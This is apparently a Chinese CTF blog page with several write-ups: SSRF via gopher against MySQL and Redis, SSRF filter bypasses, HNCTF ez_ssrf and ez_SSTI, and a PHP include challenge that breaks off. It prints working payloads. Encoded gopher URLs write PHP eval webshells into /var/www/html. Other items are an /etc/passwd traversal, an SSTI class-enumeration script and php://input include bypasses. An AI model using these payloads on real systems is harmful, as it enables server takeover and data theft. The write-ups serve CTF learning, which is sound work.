      <p>用到工具<strong>利用gopher协议无密码注入mysql</strong>，使用<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus">Gopherus工具</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>构造payload</p>
<p>python gopherus.py  –exploit mysql</p>
<ul>
<li>选择构建mysql的payload</li>
<li>设置用户名，默认root</li>
<li>sql注入，写入shell，这里<strong>使用了into outfile新建shell并写入</strong></li>
<li>得到payload</li>
</ul>
<p>登陆界面找到一个隐藏的攻击点，对其进行SSRF攻击</p>
<p><img src="/2023/07/22/SSRF%20%20web351-/Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230711213538810.png"></p>
<p>将生成的gopher链接作为returl的参数，因为<code>_</code>后面的内容或经过两次url提交，所以需要再urlencode一次：（记得只编码下划线后面的，否则容易出错）</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%45%00%00%00%03%20%73%65%6c%65%63%74%20%27%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%61%5d%29%3b%3f%3e%27%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%27%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%61%2e%70%68%70%27%3b%01%00%00%00%01</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gopher://127.0.0.1:3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2545%2500%2500%2500%2503%2520%2573%2565%256c%2565%2563%2574%2520%2527%253c%253f%2570%2568%2570%2520%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2561%255d%2529%253b%253f%253e%2527%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2527%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2561%252e%2570%2568%2570%2527%253b%2501%2500%2500%2500%2501</span><br></pre></td></tr></table></div></figure>

<p> select ‘<?php eval($_POST[cmd]);?>‘into outfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;cmd.php’;</p>
<p><img src="/2023/07/22/SSRF%20%20web351-/Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230711213337033.png"></p>

        <h2 id="web360">
          <a href="#web360" class="heading-link"><i class="fas fa-link"></i></a><a href="#web360" class="headerlink" title="web360"></a>web360</h2>
      <p>ssrf打Redis</p>
<p>写webshell</p>
<p>写ssh公钥</p>
<p>写contrab计划反弹shell</p>
<p>主从复制</p>
<p>这个题目上一题差不多，上一题打MySQL这一题打Redis</p>
<blockquote>
<p>什么是Redis未授权访问？</p>
<p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空），会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 &#x2F;root&#x2F;.ssh 文件夹的 authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器</p>
<p>简单说，漏洞的产生条件有以下两点：redis 绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网<br>没有设置密码认证（一般为空），可以免密码远程登录redis服务</p>
</blockquote>
<p><img src="/2023/07/22/SSRF%20%20web351-/1/hexoblog/img/image-20230712182723167.png"></p>
<p>若出现报错，则说明存在redis服务</p>
<p>用工具做</p>
<p><img src="/2023/07/22/SSRF%20%20web351-/1/hexoblog/img/image-20230712181653959.png"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252428%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_POST%255B1%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A</span><br></pre></td></tr></table></div></figure>


        <h2 id="补充">
          <a href="#补充" class="heading-link"><i class="fas fa-link"></i></a><a href="#补充" class="headerlink" title="补充"></a>补充</h2>
      <p>###其他绕过127的方法</p>
<p>1.如果目标代码限制访问的域名只能为 <a href="http://www.xxx.com，那么我们可以采用HTTP基本身份认证的方式绕过。即@：http://www.xxx.com@www.evil.com">http://www.xxx.com，那么我们可以采用HTTP基本身份认证的方式绕过。即@：http://www.xxx.com@www.evil.com</a> <span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://www.evil.com/">http://www.evil.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>2.<a href="http://xip.io，当访问这个服务的任意子域名的时候，都会重定向到这个子域名，如访问：http://127.0.0.1.xip.io/flag.php时，实际访问的是http://127.0.0.1/1.php">http://xip.io，当访问这个服务的任意子域名的时候，都会重定向到这个子域名，如访问：http://127.0.0.1.xip.io/flag.php时，实际访问的是http://127.0.0.1/1.php</a> 像这样的网址还有 <span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://nip.io,http//sslip.io">http://nip.io，http://sslip.io</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>3.短网址目前基本都需要登录使用，如缩我，<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://4m.cn/">https://4m.cn/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>4.各种指向127.0.0.1的地址：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/         # localhost就是代指127.0.0.1</span><br><span class="line">http://0/                 # 0在window下代表0.0.0.0，而在liunx下代表127.0.0.1</span><br><span class="line">http://[0:0:0:0:0:ffff:127.0.0.1]/    # 在liunx下可用，window测试了下不行</span><br><span class="line">http://[::]:80/           # 在liunx下可用，window测试了下不行</span><br><span class="line">http://127。0。0。1/       # 用中文句号绕过</span><br><span class="line">http://①②⑦.⓪.⓪.①</span><br><span class="line">http://127.1/</span><br><span class="line">http://127.00000.00000.001/ # 0的数量多一点少一点都没影响，最后还是会指向127.0.0.1</span><br></pre></td></tr></table></div></figure>

<p>利用不存在的协议头绕过指定的协议头</p>
<p>file_get_contents()函数的一个特性，即当PHP的file_get_contents()函数在遇到不认识的协议头时候会将这个协议头当做文件夹，造成目录穿越漏洞，这时候只需不断往上跳转目录即可读到根目录的文件。（include()函数也有类似的特性）</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// ssrf.php</span><br><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(!preg_match(&#x27;/^https/is&#x27;,$_GET[&#x27;url&#x27;]))&#123;</span><br><span class="line">die(&quot;no hack&quot;);</span><br><span class="line">&#125;</span><br><span class="line">echo file_get_contents($_GET[&#x27;url&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>

<p>上面的代码限制了url只能是以https开头的路径，那么我们就可以如下：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">httpsssss://</span><br></pre></td></tr></table></div></figure>

<p>此时file_get_contents()函数遇到了不认识的伪协议头“httpsssss:&#x2F;&#x2F;”，就会将他当做文件夹，然后再配合目录穿越即可读取文件：</p>
<figure class="highlight basic"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssrf.php?url=httpsssss://../../../../../../etc/passwd</span><br></pre></td></tr></table></div></figure>

<p>###URL解析差异</p>
<p>1.readfile和parse_user函数解析差异绕过指定端口</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://&#x27;</span>. <span class="variable">$_GET</span>[url];</span><br><span class="line"><span class="variable">$parsed</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$parsed</span>[port] == <span class="number">80</span> )&#123;  <span class="comment">// 这里限制了我们传过去的url只能是80端口的</span></span><br><span class="line">	<span class="title function_ invoke__">readfile</span>(<span class="variable">$url</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;Hacker!&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>上述代码限制了我们传过去的url只能是80端口的，但如果我们想去读取11211端口的文件的话，我们可以用以下方法绕过</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssrf.php</span><br><span class="line">    </span><br><span class="line">    ?url=<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">11211</span>:<span class="number">80</span>/flag.txt</span><br></pre></td></tr></table></div></figure>

<p>可以成功读取11211端口flag.txt文件，原理如下图</p>
<p><img src="/2023/07/22/SSRF%20%20web351-/1/hexoblog/img/image-20230712190451055.png" alt="image-20230712190451055"></p>
<p>两个函数解析host也存在差异</p>
<p><img src="/2023/07/22/SSRF%20%20web351-/1/hexoblog/img/cc15c26e93dfaac450eaa31c71c8d40a.jpeg" alt="1610601347_5fffd383dfc1a3982425f.png!small?1610601348433"></p>
<p><strong>2.利用curl和parse_url的解析差异绕过指定host</strong></p>
<p><img src="/2023/07/22/SSRF%20%20web351-/1/hexoblog/img/image-20230712190638172.png" alt="image-20230712190638172"></p>

        <h3 id="Gopher协议">
          <a href="#Gopher协议" class="heading-link"><i class="fas fa-link"></i></a><a href="#Gopher协议" class="headerlink" title="Gopher协议"></a>Gopher协议</h3>
      <p>Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用TCP 70端口</p>
<p>Gopher协议支持发出GET、POST请求，我们可以先截获GET请求包和POST请求包，再构造成符合Gopher协议请求的payload进行SSRF利用，甚至可以用它来攻击内网中的Redis、MySql、FastCGI等应用，这无疑大大扩展了我们的SSRF攻击面</p>
<p>Gopher协议格式</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL: gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</span><br></pre></td></tr></table></div></figure>

<p>注意不要忘记后面那个下划线”<em>“，下划线”</em>“后面才开始接TCP数据流，如果不加这个”_”，那么服务端收到的消息将不是完整的，该字符可随意写。</p>
<p>如果发起POST请求，回车换行需要使用%0d%0a来代替%0a，如果多个参数，参数之间的&amp;也需要进行URL编码</p>
<p>利用Gopher协议发送HTTP请求步骤</p>
<p>在gopher协议中发送HTTP的数据，需要以下三步：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.抓取或构造HTTP数据包</span><br><span class="line">2.URL编码、将回车换行符%0a替换为%0d%0a</span><br><span class="line">3.发送符合gopher协议格式的请求</span><br></pre></td></tr></table></div></figure>

<p>注意这几个问题：</p>
<pre><code>问号（?）需要转码为URL编码，也就是%3f
回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a
在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）
</code></pre>

        <h1 id="HNCTF-2022-WEEK2-ez-ssrf">
          <a href="#HNCTF-2022-WEEK2-ez-ssrf" class="heading-link"><i class="fas fa-link"></i></a><a href="#HNCTF-2022-WEEK2-ez-ssrf" class="headerlink" title="[HNCTF 2022 WEEK2]ez_ssrf"></a>[HNCTF 2022 WEEK2]ez_ssrf</h1>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"><span class="variable">$port</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;port&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>,<span class="title function_ invoke__">intval</span>(<span class="variable">$port</span>),<span class="variable">$error</span>,<span class="variable">$errstr</span>,<span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$fp</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">while</span>(!<span class="title function_ invoke__">feof</span>(<span class="variable">$data</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>,<span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></div></figure>

<p>这段代码接受通过 GET 请求传递的参数，并使用 <code>fsockopen()</code> 函数建立与指定主机和端口的 socket 连接。然后，它将传入的 base64 编码的数据解码，并将数据写入到连接的 socket 中。接下来，在循环中，它从连接中读取返回的响应数据，并将其输出到浏览器。</p>
<p>请注意，这段代码存在一些安全风险：</p>
<ol>
<li>没有对输入参数进行任何验证和过滤。这可能导致安全漏洞，如远程命令执行和代码注入攻击，请务必加以验证和过滤用户输入。</li>
<li>关闭 <code>error_reporting</code>，这会隐藏任何可能的错误信息，使得调试和错误处理变得困难，建议在开发和测试阶段启用错误报告以及适当的错误处理。</li>
</ol>
<p>建议对该代码进行改进和增强，以提高安全性和代码可靠性。</p>
<p>** <code>fsockopen()</code> 函数是用于建立一个 socket 连接。该函数的参数包括：</p>
<ul>
<li><code>$host</code>：要连接的主机名或 IP 地址。</li>
<li><code>intval($port)</code>：要连接的端口号，其中 <code>intval()</code> 函数将端口号转换为整数。</li>
<li><code>$error</code>：一个传入参数，用于获取错误代码（如果有错误发生）。</li>
<li><code>$errstr</code>：一个传入参数，用于获取错误描述信息（如果有错误发生）。</li>
<li><code>30</code>：超时时间，以秒为单位。****</li>
</ul>

        <h3 id="题解">
          <a href="#题解" class="heading-link"><i class="fas fa-link"></i></a><a href="#题解" class="headerlink" title="题解"></a>题解</h3>
      <p>首先本地构造一个文件，让他跳转到127.0.0.1，用来伪造请求</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$out = &quot;GET /flag.php HTTP/1.1\r\n&quot;;</span><br><span class="line">$out .= &quot;Host: 127.0.0.1\r\n&quot;;</span><br><span class="line">$out .= &quot;Connection: Keep-Alive\r\n\r\n&quot;;</span><br><span class="line">echo $out;</span><br><span class="line">echo base64_encode($out)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>

<p>我要将这一段信息通过fwrite写进我们的会话中的，这些就是请求头</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: www.wrox.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.6)</span><br><span class="line">Gecko/20050225 Firefox/1.0.1</span><br><span class="line">Connection: Keep-Alive</span><br></pre></td></tr></table></div></figure>

<p><img src="/2023/07/22/SSRF%20%20web351-/1/hexoblog/img/image-20230712195039783.png" alt="image-20230712195039783"></p>
<p>手写一个127.0.0.1的请求头格式，base64编码一下就好</p>
<p><img src="/2023/07/22/SSRF%20%20web351-/1/hexoblog/img/image-20230712201519214.png" alt="image-20230712201519214"></p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">playload：？host=<span class="number">127.0</span>.<span class="number">0.1</span>&amp;port=<span class="number">80</span>&amp;data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBLZWVwLUFsaXZlDQoNCg==</span><br></pre></td></tr></table></div></figure></div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/07/21/HNCTF%202022%20WEEK2%20%20ez_SSTI/">HNCTF 2022 WEEK2  ez_SSTI</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-07-21</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-11-12</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="HNCTF-2022-WEEK2-ez-SSTI">
          <a href="#HNCTF-2022-WEEK2-ez-SSTI" class="heading-link"><i class="fas fa-link"></i></a><a href="#HNCTF-2022-WEEK2-ez-SSTI" class="headerlink" title="HNCTF 2022 WEEK2  ez_SSTI"></a>HNCTF 2022 WEEK2  ez_SSTI</h1>
      <p><img src="/2023/07/21/HNCTF%202022%20WEEK2%20%20ez_SSTI/AAwangzhan\1\hexoblog\source\image\image-20230721095059045.png"></p>

        <h1 id="WELCOME-TO-HNCTF">
          <a href="#WELCOME-TO-HNCTF" class="heading-link"><i class="fas fa-link"></i></a><a href="#WELCOME-TO-HNCTF" class="headerlink" title="WELCOME TO HNCTF"></a>WELCOME TO HNCTF</h1>
      <p>今天来做一下<strong>WELCOME TO HNCTF</strong></p>
<p>打开题目有一个链接，打开一看，跳转到别的地方去了，测试了一下，存在ssti注入漏洞</p>
<p><img src="/2023/07/21/HNCTF%202022%20WEEK2%20%20ez_SSTI/AAwangzhan\1\hexoblog\source\image\image-20230721095310676.png"></p>
<p>跑出来了所有的类</p>
<p><img src="/2023/07/21/HNCTF%202022%20WEEK2%20%20ez_SSTI/AAwangzhan\1\hexoblog\source\image\image-20230721100049475.png"></p>
<p>我们去找我们需要用到的os模块在第几个，用脚本去跑</p>
<p><img src="/2023/07/21/HNCTF%202022%20WEEK2%20%20ez_SSTI/AAwangzhan\1\hexoblog\source\image\image-20230721100029882.png"></p>
<p>附跑ssti模块的脚本：</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    url = <span class="string">&quot;http://node2.anna.nssctf.cn:28081/?name=&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;]&#125;&#125;&quot;</span></span><br><span class="line">    res = requests.get(url=url, headers=headers)</span><br><span class="line">    <span class="comment">#print(res.text)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;os._wrap_close&#x27;</span> <span class="keyword">in</span> res.text:    //想利用的模块名可以换</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>接这里用os模块中的popen()来执行命令</p>
<p><img src="/2023/07/21/HNCTF%202022%20WEEK2%20%20ez_SSTI/AAwangzhan\1\hexoblog\source\image\image-20230721101152276.png"></p>
<p><img src="/2023/07/21/HNCTF%202022%20WEEK2%20%20ez_SSTI/AAwangzhan\1\hexoblog\source\image\image-20230721101047957.png"></p>
<p>总结：一些基础魔术方法的利用，未发现过滤，基础题</p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/07/20/php-include/">Php_include</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-07-20</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-11-12</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="Web-php-include">
          <a href="#Web-php-include" class="heading-link"><i class="fas fa-link"></i></a><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h1>
      <p>源码</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"><span class="keyword">while</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$page</span>, <span class="string">&quot;php://&quot;</span>)) &#123;</span><br><span class="line">    <span class="variable">$page</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$page</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$page</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>看源码，绕过两个函数拿到动态flag，一个比较简单的文件包含</p>
<p>先看第一个函数<strong>strstr（）</strong></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、strstr() 函数搜索一个字符串在另一个字符串中的第一次出现。如果是，返回字符串及剩余部分，否则返回false。</span><br><span class="line"><span class="number">2</span>、找到所搜索的字符串，则该函数返回第一次匹配的字符串的地址；</span><br></pre></td></tr></table></div></figure>

<p>str_replace()函数</p>
<p>定义和用法：<br> <strong>以其它字符替换字符串中的一些字符（区分大小写）</strong><br> 语法：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str_replace(find,replace,string,count)</span><br></pre></td></tr></table></div></figure>

<p> find,必需，要查找的值<br> replace，必需，要替换的值<br> string，必需，被搜索的字符串<br> count，可选，替换次数</p>
<p>在这个题目中，就是匹配page变量中的php:&#x2F;&#x2F;替换为空</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$page</span>, <span class="string">&quot;php://&quot;</span>)) &#123;     <span class="comment">//查找page中的php：//，若存在则返回为空</span></span><br><span class="line">    <span class="variable">$page</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$page</span>); <span class="comment">//匹配page变量中的php://替换为空</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="方法1（大小写绕过）：">
          <a href="#方法1（大小写绕过）：" class="heading-link"><i class="fas fa-link"></i></a><a href="#方法1（大小写绕过）：" class="headerlink" title="方法1（大小写绕过）："></a><strong>方法1（大小写绕过）：</strong></h2>
      <p>利用php伪协议大小写绕过</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=PHP://input</span><br></pre></td></tr></table></div></figure>

<p>先get传进去</p>
<p><img src="/2023/07/20/php-include/AAwangzhan\1\hexoblog\source\image\image-20230720200207233.png"></p>
<p>之后写命令执行</p>
<p><img src="/2023/07/20/php-include/AAwangzhan\1\hexoblog\source\image\image-20230720200246031.png"></p>

        <h2 id="方法2（data-上传木马）">
          <a href="#方法2（data-上传木马）" class="heading-link"><i class="fas fa-link"></i></a><a href="#方法2（data-上传木马）" class="headerlink" title="方法2（data:&#x2F;&#x2F;上传木马）"></a>方法2（data:&#x2F;&#x2F;上传木马）</h2>
      <p>第一种链接方式：</p>
